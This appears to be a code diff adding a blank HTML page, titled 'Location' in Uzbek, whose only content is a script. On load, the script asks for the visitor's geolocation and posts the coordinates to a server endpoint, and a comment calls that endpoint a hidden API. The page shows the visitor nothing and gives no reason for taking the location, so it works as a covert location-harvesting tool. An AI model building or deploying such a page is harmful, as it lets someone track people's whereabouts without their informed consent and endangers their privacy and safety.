@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <title>Joylashuv</title>
+</head>
+<body>
+    <script>
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    // Ma'lumotni yashirin api-mizga yuboramiz
+                    fetch('/api/send', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        })
+                    })
+                    .then(res => res.json())
+                    .then(data => console.log("Yuborildi:", data))
+                    .catch(err => console.error("Xato:", err));
+                });
+            }
+        };
+    </script>
+</body>
+</html>
